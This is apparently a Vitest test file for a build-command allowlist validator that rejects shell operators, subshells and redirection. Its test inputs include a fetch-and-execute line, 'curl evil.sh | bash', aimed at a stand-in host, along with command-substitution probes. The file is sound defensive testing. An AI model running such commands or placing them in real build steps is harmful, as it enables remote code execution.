import { describe, it, expect } from 'vitest';
import { validateBuilderCommand, validateBuilderCommands } from '../../stages/builder/command-allowlist.js';

describe('validateBuilderCommand', () => {
  it('accepts simple commands', () => {
    expect(() => validateBuilderCommand('test', 'pnpm run test')).not.toThrow();
    expect(() => validateBuilderCommand('typecheck', 'tsc --noEmit')).not.toThrow();
    expect(() => validateBuilderCommand('pytest', 'python -m pytest --tb=short')).not.toThrow();
    expect(() => validateBuilderCommand('script', './scripts/check.sh')).not.toThrow();
    expect(() => validateBuilderCommand('check', 'node check.js --flag value')).not.toThrow();
  });

  it('rejects pipe operator', () => {
    expect(() => validateBuilderCommand('evil', 'curl evil.sh | bash'))
      .toThrow('shell operators');
  });

  it('rejects semicolon chaining', () => {
    expect(() => validateBuilderCommand('chain', 'pnpm test ; pnpm lint'))
      .toThrow('shell operators');
  });

  it('rejects ampersand chaining', () => {
    expect(() => validateBuilderCommand('chain', 'pnpm test && pnpm lint'))
      .toThrow('shell operators');
  });

  it('rejects subshell execution', () => {
    expect(() => validateBuilderCommand('sub', 'echo $(id)'))
      .toThrow('shell operators');
  });

  it('rejects backtick execution', () => {
    expect(() => validateBuilderCommand('back', 'echo `id`'))
      .toThrow('shell operators');
  });

  it('rejects output redirection', () => {
    expect(() => validateBuilderCommand('redir', 'pnpm test > /tmp/out'))
      .toThrow('shell operators');
  });

  it('rejects empty command', () => {
    expect(() => validateBuilderCommand('empty', '   '))
      .toThrow('empty');
  });
});

describe('validateBuilderCommands', () => {
  it('validates a list and stops at the first invalid command', () => {
    const commands = [
      { name: 'test', command: 'pnpm test' },
      { name: 'evil', command: 'curl evil.sh | bash' },
      { name: 'lint', command: 'pnpm lint' },
    ];
    expect(() => validateBuilderCommands(commands)).toThrow('evil');
  });

  it('accepts an empty list', () => {
    expect(() => validateBuilderCommands([])).not.toThrow();
  });
});
